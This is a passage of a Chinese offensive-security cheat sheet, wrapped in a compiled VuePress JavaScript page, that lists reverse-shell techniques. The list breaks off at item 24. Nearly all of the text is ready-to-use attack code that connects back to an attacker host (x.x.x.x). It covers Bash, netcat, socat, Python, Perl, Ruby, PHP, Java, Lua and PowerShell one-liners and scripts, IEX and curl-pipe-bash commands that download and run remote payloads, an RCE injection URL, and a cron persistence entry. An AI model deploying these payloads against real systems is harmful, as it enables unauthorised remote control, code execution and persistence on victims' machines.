import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,f as e,o as i}from"./app-CxU3ZM_G.js";const l={};function p(t,s){return i(),a("div",null,[...s[0]||(s[0]=[e(`<h1 id="全面解析-27-种-webshell-反弹技术" tabindex="-1"><a class="header-anchor" href="#全面解析-27-种-webshell-反弹技术"><span>全面解析 27 种 WebShell 反弹技术</span></a></h1><h3 id="_1-bash反弹" tabindex="-1"><a class="header-anchor" href="#_1-bash反弹"><span>1. Bash反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 攻击者主机上执行监听</span></span>
<span class="line"><span>nc -lvvp port</span></span>
<span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-netcat反弹" tabindex="-1"><a class="header-anchor" href="#_2-netcat反弹"><span>2. Netcat反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 攻击者主机上执行监听</span></span>
<span class="line"><span>nc -lvvp port</span></span>
<span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>nc -e /bin/bash x.x.x.x port</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_3-telnet反弹" tabindex="-1"><a class="header-anchor" href="#_3-telnet反弹"><span>3. Telnet反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 攻击者主机上打开两个终端分别执行监听</span></span>
<span class="line"><span>nc -lvvp 4444</span></span>
<span class="line"><span>nc -lvvp 5555</span></span>
<span class="line"><span># 目标主机中执行</span></span>
<span class="line"><span>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_4-socat反弹" tabindex="-1"><a class="header-anchor" href="#_4-socat反弹"><span>4. Socat反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 攻击者主机上执行监听</span></span>
<span class="line"><span>socat TCP-LISTEN:port,fork -</span></span>
<span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>socat tcp-connect:x.x.x.x:port exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_5-python反弹" tabindex="-1"><a class="header-anchor" href="#_5-python反弹"><span>5. Python反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_6-perl反弹" tabindex="-1"><a class="header-anchor" href="#_6-perl反弹"><span>6. Perl反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>perl -e &#39;use Socket;$i=&quot;x.x.x.x&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_7-ruby反弹" tabindex="-1"><a class="header-anchor" href="#_7-ruby反弹"><span>7. Ruby反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_8-php反弹" tabindex="-1"><a class="header-anchor" href="#_8-php反弹"><span>8. PHP反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 目标主机上执行（假设有Web服务器权限）</span></span>
<span class="line"><span>php -r &#39;$sock=fsockopen(&quot;x.x.x.x&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_9-powershell反弹-windows环境" tabindex="-1"><a class="header-anchor" href="#_9-powershell反弹-windows环境"><span>9. Powershell反弹（Windows环境）</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 攻击者主机上执行监听（使用Powercat脚本）</span></span>
<span class="line"><span>powershell IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://x.x.x.x:port/powercat.ps1&#39;); powercat -c x.x.x.x -p port -e cmd</span></span>
<span class="line"><span># 目标主机上执行（假设可以下载并执行Powercat脚本）</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_10-openssl反弹" tabindex="-1"><a class="header-anchor" href="#_10-openssl反弹"><span>10. OpenSSL反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 这种方法利用OpenSSL生成自签名证书，并通过TLS/SSL隧道传输shell会话。</span></span>
<span class="line"><span># 攻击者主机上生成密钥并启用监听</span></span>
<span class="line"><span>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span></span>
<span class="line"><span>openssl s_server -quiet -key key.pem -cert cert.pem -port port</span></span>
<span class="line"><span># 目标主机上执行</span></span>
<span class="line"><span>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect x.x.x.x:port &gt; /tmp/s; rm /tmp/s</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_11-java反弹" tabindex="-1"><a class="header-anchor" href="#_11-java反弹"><span>11. Java反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>import java.io.*;</span></span>
<span class="line"><span>import java.net.*;</span></span>
<span class="line"><span>publicclassReverseShell{</span></span>
<span class="line"><span>publicstaticvoidmain(String[] args){</span></span>
<span class="line"><span>Stringhost=&quot;x.x.x.x&quot;;// 攻击者IP</span></span>
<span class="line"><span>intport=1234;// 监听端口</span></span>
<span class="line"><span>try(Socketsocket=newSocket(host, port);</span></span>
<span class="line"><span>BufferedReaderin=newBufferedReader(newInputStreamReader(socket.getInputStream()));</span></span>
<span class="line"><span>PrintWriterout=newPrintWriter(socket.getOutputStream(),true);</span></span>
<span class="line"><span>BufferedReaderstdIn=newBufferedReader(newInputStreamReader(System.in));</span></span>
<span class="line"><span>BufferedWriterstdOut=newBufferedWriter(newOutputStreamWriter(System.out))){</span></span>
<span class="line"><span>// 线程用于读取攻击者的命令并执行</span></span>
<span class="line"><span>newThread(()-&gt;{</span></span>
<span class="line"><span>try{</span></span>
<span class="line"><span>String command;</span></span>
<span class="line"><span>while((command = in.readLine())!=null){</span></span>
<span class="line"><span>Processprocess=Runtime.getRuntime().exec(command);</span></span>
<span class="line"><span>// 获取命令输出</span></span>
<span class="line"><span>try(BufferedReaderprocessIn=newBufferedReader(newInputStreamReader(process.getInputStream()));</span></span>
<span class="line"><span>BufferedReaderprocessError=newBufferedReader(newInputStreamReader(process.getErrorStream()))){</span></span>
<span class="line"><span>String line;</span></span>
<span class="line"><span>while((line = processIn.readLine())!=null){</span></span>
<span class="line"><span>                                out.println(line);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>while((line = processError.readLine())!=null){</span></span>
<span class="line"><span>                                out.println(line);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}catch(Exception e){</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}).start();</span></span>
<span class="line"><span>// 线程用于将本地shell的输出发送到攻击者</span></span>
<span class="line"><span>newThread(()-&gt;{</span></span>
<span class="line"><span>try{</span></span>
<span class="line"><span>String line;</span></span>
<span class="line"><span>while((line = stdIn.readLine())!=null){</span></span>
<span class="line"><span>                        out.println(line);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}catch(IOException e){</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}).start();</span></span>
<span class="line"><span>}catch(IOException e){</span></span>
<span class="line"><span>            e.printStackTrace();</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_12-lua反弹" tabindex="-1"><a class="header-anchor" href="#_12-lua反弹"><span>12. Lua反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>local host =&quot;x.x.x.x&quot;</span></span>
<span class="line"><span>local port =1234</span></span>
<span class="line"><span>local socket =require(&quot;socket&quot;)</span></span>
<span class="line"><span>local tcp = socket.tcp()</span></span>
<span class="line"><span>tcp:connect(host, port)</span></span>
<span class="line"><span>localfunction read_command()</span></span>
<span class="line"><span>local command = tcp:receive(&quot;*l&quot;)</span></span>
<span class="line"><span>return command</span></span>
<span class="line"><span>end</span></span>
<span class="line"><span>localfunction execute_command(command)</span></span>
<span class="line"><span>local file =io.popen(command)</span></span>
<span class="line"><span>localoutput= file:read(&quot;*all&quot;)</span></span>
<span class="line"><span>    file:close()</span></span>
<span class="line"><span>    tcp:send(output..&quot;\\n&quot;)</span></span>
<span class="line"><span>end</span></span>
<span class="line"><span>whiletruedo</span></span>
<span class="line"><span>local command = read_command()</span></span>
<span class="line"><span>if command ==nilthenbreakend</span></span>
<span class="line"><span>    execute_command(command)</span></span>
<span class="line"><span>end</span></span>
<span class="line"><span>tcp:close()</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_13-nishang框架-powershell" tabindex="-1"><a class="header-anchor" href="#_13-nishang框架-powershell"><span>13. Nishang框架（PowerShell）</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 在攻击者机器上监听</span></span>
<span class="line"><span>IEX (New-Object Net.WebClient).DownloadString(&#39;http://x.x.x.x/Invoke-PowerShellTcp.ps1&#39;)</span></span>
<span class="line"><span>Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 1234</span></span>
<span class="line"><span># 在目标机器上执行（假设可以下载并执行脚本）</span></span>
<span class="line"><span>IEX (New-Object Net.WebClient).DownloadString(&#39;http://x.x.x.x/Invoke-ReverseTcpShell.ps1&#39;)</span></span>
<span class="line"><span>Invoke-ReverseTcpShell -IPAddress x.x.x.x -Port 1234</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_14-使用web服务器" tabindex="-1"><a class="header-anchor" href="#_14-使用web服务器"><span>14. 使用Web服务器</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>&lt;?php</span></span>
<span class="line"><span>$ip=&#39;x.x.x.x&#39;;// 攻击者IP</span></span>
<span class="line"><span>$port=1234;// 监听端口</span></span>
<span class="line"><span>$sock=fsockopen($ip,$port);</span></span>
<span class="line"><span>$proc=proc_open(&#39;/bin/bash -i&#39;,array(0=&gt;$sock,1=&gt;$sock,2=&gt;$sock),$pipes);</span></span>
<span class="line"><span>?&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_15-利用系统工具-如curl或wget" tabindex="-1"><a class="header-anchor" href="#_15-利用系统工具-如curl或wget"><span>15. 利用系统工具（如curl或wget）</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 在攻击者机器上创建一个简单的bash反弹shell脚本，并将其托管在Web服务器上</span></span>
<span class="line"><span>echo &#39;bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1&#39; &gt; reverse_shell.sh</span></span>
<span class="line"><span>python3 -m http.server 80  # 使用Python的HTTP服务器托管脚本</span></span>
<span class="line"><span># 在目标机器上执行curl命令下载并执行反弹shell脚本</span></span>
<span class="line"><span>curl http://x.x.x.x/reverse_shell.sh | bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_16-利用漏洞-如远程代码执行漏洞" tabindex="-1"><a class="header-anchor" href="#_16-利用漏洞-如远程代码执行漏洞"><span>16. 利用漏洞（如远程代码执行漏洞）</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 假设目标系统有一个RCE漏洞，可以通过URL参数执行任意命令</span></span>
<span class="line"><span># 例如：http://target.com/vulnerable_page.php?cmd=whoami</span></span>
<span class="line"><span># 构造反弹shell命令并通过RCE漏洞执行</span></span>
<span class="line"><span>curl &quot;http://target.com/vulnerable_page.php?cmd=bash+-i+&gt;&amp;+/dev/tcp/x.x.x.x/1234+0&gt;&amp;1&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_17-自定义脚本" tabindex="-1"><a class="header-anchor" href="#_17-自定义脚本"><span>17. 自定义脚本</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>import os</span></span>
<span class="line"><span>import socket</span></span>
<span class="line"><span>host =&#39;x.x.x.x&#39;# 攻击者IP</span></span>
<span class="line"><span>port =1234# 监听端口</span></span>
<span class="line"><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span>
<span class="line"><span>s.connect((host, port))</span></span>
<span class="line"><span>os.dup2(s.fileno(),0)# stdin</span></span>
<span class="line"><span>os.dup2(s.fileno(),1)# stdout</span></span>
<span class="line"><span>os.dup2(s.fileno(),2)# stderr</span></span>
<span class="line"><span>os.system(&#39;/bin/bash -i&#39;)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_18-使用python的pty库模拟终端" tabindex="-1"><a class="header-anchor" href="#_18-使用python的pty库模拟终端"><span>18. 使用Python的<code>pty</code>库模拟终端</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>import os</span></span>
<span class="line"><span>import pty</span></span>
<span class="line"><span>import socket</span></span>
<span class="line"><span>host =&#39;x.x.x.x&#39;</span></span>
<span class="line"><span>port =1234</span></span>
<span class="line"><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span>
<span class="line"><span>s.connect((host, port))</span></span>
<span class="line"><span># 使用pty模拟终端</span></span>
<span class="line"><span>master, slave = pty.openpty()</span></span>
<span class="line"><span>os.dup2(slave.fileno(),0)</span></span>
<span class="line"><span>os.dup2(slave.fileno(),1)</span></span>
<span class="line"><span>os.dup2(slave.fileno(),2)</span></span>
<span class="line"><span>os.execvp(&#39;/bin/bash&#39;,[&#39;/bin/bash&#39;,&#39;-i&#39;])</span></span>
<span class="line"><span># 注意：在实际使用中，可能需要在攻击者端使用类似screen或tmux的工具来管理pty会话</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_19-利用python的paramiko库进行ssh反弹" tabindex="-1"><a class="header-anchor" href="#_19-利用python的paramiko库进行ssh反弹"><span>19. 利用Python的<code>paramiko</code>库进行SSH反弹</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>import paramiko</span></span>
<span class="line"><span>import subprocess</span></span>
<span class="line"><span>import os</span></span>
<span class="line"><span># 攻击者端设置SSH服务器监听</span></span>
<span class="line"><span># 需要一个外部的SSH服务器或者使用Python的SSH库（如paramiko的ServerInterface）来模拟</span></span>
<span class="line"><span># 这里假设已经有一个SSH服务器在监听</span></span>
<span class="line"><span># 目标端执行以下Python代码</span></span>
<span class="line"><span>hostname =&#39;x.x.x.x&#39;# 攻击者SSH服务器IP</span></span>
<span class="line"><span>port =22</span></span>
<span class="line"><span>username =&#39;attacker_user&#39;</span></span>
<span class="line"><span>password =&#39;attacker_password&#39;</span></span>
<span class="line"><span>client = paramiko.SSHClient()</span></span>
<span class="line"><span>client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span></span>
<span class="line"><span>client.connect(hostname, port, username, password)</span></span>
<span class="line"><span># 开启一个反向隧道</span></span>
<span class="line"><span>transport = client.get_transport()</span></span>
<span class="line"><span>chan = transport.open_session()</span></span>
<span class="line"><span>chan.invoke_shell()</span></span>
<span class="line"><span># 将标准输入、输出和错误输出重定向到该SSH会话</span></span>
<span class="line"><span>os.dup2(chan.makefile(&#39;wb&#39;,-1).fileno(),1)</span></span>
<span class="line"><span>os.dup2(chan.makefile(&#39;rb&#39;,-1).fileno(),0)</span></span>
<span class="line"><span>os.dup2(chan.makefile_stderr(&#39;rb&#39;,-1).fileno(),2)</span></span>
<span class="line"><span># 启动bash shell</span></span>
<span class="line"><span>os.execvp(&#39;/bin/bash&#39;,[&#39;/bin/bash&#39;,&#39;-i&#39;])</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_20-使用perl的io-socket模块" tabindex="-1"><a class="header-anchor" href="#_20-使用perl的io-socket模块"><span>20. 使用Perl的<code>IO::Socket</code>模块</span></a></h3><p>Perl的<code>IO::Socket</code>模块可以用于创建网络连接，从而实现反弹shell。</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>#!/usr/bin/perl -w</span></span>
<span class="line"><span>use strict;</span></span>
<span class="line"><span>use IO::Socket::INET;</span></span>
<span class="line"><span>my $remote_ip =&#39;x.x.x.x&#39;;# 攻击者IP</span></span>
<span class="line"><span>my $remote_port =1234;# 监听端口</span></span>
<span class="line"><span>my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $remote_ip,PeerPort =&gt; $remote_port,Proto =&gt;&#39;tcp&#39;);</span></span>
<span class="line"><span>die&quot;Could not create socket: $!\\n&quot;unless $sock;</span></span>
<span class="line"><span># 将标准输入、输出和错误输出重定向到socket</span></span>
<span class="line"><span>open STDIN,&quot;&gt;&amp;=$sock&quot;;</span></span>
<span class="line"><span>open STDOUT,&quot;&gt;&amp;=$sock&quot;;</span></span>
<span class="line"><span>open STDERR,&quot;&gt;&amp;=$sock&quot;;</span></span>
<span class="line"><span># 启动shell</span></span>
<span class="line"><span>exec(&quot;/bin/bash -i&quot;);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_21-利用java的jsch库进行ssh反弹-类似paramiko" tabindex="-1"><a class="header-anchor" href="#_21-利用java的jsch库进行ssh反弹-类似paramiko"><span>21. 利用Java的<code>JSch</code>库进行SSH反弹（类似paramiko）</span></a></h3><p><code>JSch</code>是一个Java实现的SSH2库，可以用于创建SSH连接。如果目标系统允许SSH连接，并且攻击者拥有凭据，那么可以使用<code>JSch</code>进行SSH反弹。</p><p>因为涉及的内容较多，包括设置SSH服务器、处理认证等，不再给出完整的Java代码示例。但基本思路是：在攻击者端设置一个SSH服务器，然后在目标端使用<code>JSch</code>库连接到该服务器，并开启一个反向隧道。</p><h3 id="_22-使用ruby的drb-distributed-ruby-进行反弹" tabindex="-1"><a class="header-anchor" href="#_22-使用ruby的drb-distributed-ruby-进行反弹"><span>22. 使用Ruby的<code>drb</code>（Distributed Ruby）进行反弹</span></a></h3><p>Ruby的<code>drb</code>（Distributed Ruby）可以用于创建分布式对象系统。虽然不常用于反弹shell，但在某些场景下可能是一个有趣的选择。</p><p><strong>注意</strong>：由于<code>drb</code>不是专门用于反弹shell的，因此实现起来可能比较复杂，并且需要攻击者设置一个DRuby服务器。</p><h3 id="_23-利用目标系统的计划任务或cron作业" tabindex="-1"><a class="header-anchor" href="#_23-利用目标系统的计划任务或cron作业"><span>23. 利用目标系统的计划任务或cron作业</span></a></h3><p>如果攻击者能够在目标系统上添加计划任务或cron作业，那么可以设置一个任务来执行反弹shell命令。</p><p>例如，在Linux系统上，可以使用<code>crontab -e</code>来添加一个定时任务：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>* * * * * /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>注意</strong>：这种方法需要攻击者具有在目标系统上添加计划任务或cron作业的权限。</p><h3 id="_24-使用目标系统的服务或守护进程" tabindex="-1"><a class="header-anchor" href="#_24-使用目标系统的服务或守护进程"><span>24. 